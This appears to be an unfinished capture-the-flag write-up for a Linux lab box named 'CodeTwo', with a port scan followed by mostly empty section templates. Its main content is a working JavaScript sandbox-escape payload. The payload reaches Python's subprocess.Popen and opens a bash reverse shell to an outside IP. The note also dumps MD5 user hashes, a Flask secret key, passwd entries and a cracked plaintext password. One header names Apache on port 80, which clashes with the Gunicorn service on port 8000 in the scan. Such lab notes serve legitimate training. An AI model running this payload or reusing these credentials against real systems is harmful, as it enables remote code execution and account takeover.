---
os: linux
status: 
tags:
  - sandbox
  - flask
  - python
  - javascript
aliases:
---
# Information Gathering

Scanned TCP ports:

```sh
PORT     STATE SERVICE REASON         VERSION                                                    
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                                   
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)                    
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajG
okSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukh
wMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Enumeration

## Port 80 - HTTP (Apache)
Found ssti vulnerable application.

```javascript
let cmd = "bash -c 'bash -i >& /dev/tcp/10.200.22.81/4444 0>&1'";
let hacked = Object.getOwnPropertyNames({});
let bymarve = hacked.__getattribute__;
let n11 = bymarve("__getattribute__");
let obj = n11("__class__").__base__;
let getattr = obj.__getattribute__;

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}

let popen = findpopen(obj);
let proc = popen(cmd, -1, null, -1, -1, -1, null, null, true); 
proc.communicate();
```

database
```
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'test','3e6ecbbf67e1c9e7f1e1902bae417e30');
INSERT INTO user VALUES(4,'test''','3e6ecbbf67e1c9e7f1e1902bae417e30');
INSERT INTO user VALUES(5,'test''--','3e6ecbbf67e1c9e7f1e1902bae417e30');
INSERT INTO user VALUES(6,'test'';--','3e6ecbbf67e1c9e7f1e1902bae417e30');
INSERT INTO user VALUES(7,'haxor','663d05fb002ce8223ce43f15bcc0562c');
INSERT INTO user VALUES(8,'mc1','ce7af47187c49b266339d62229ab9b88');
INSERT INTO user VALUES(9,'mine','918b81db5e91d031548b963c93845e5b');
INSERT INTO user VALUES(10,'test1','098f6bcd4621d373cade4e832627b4f6');

app.secret_key = 'S3cr3tK3yC0d3Tw0'


root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash


marco sweetangelbabylove
```


```
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
```


---

# Exploitation

## SQL Injection


---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```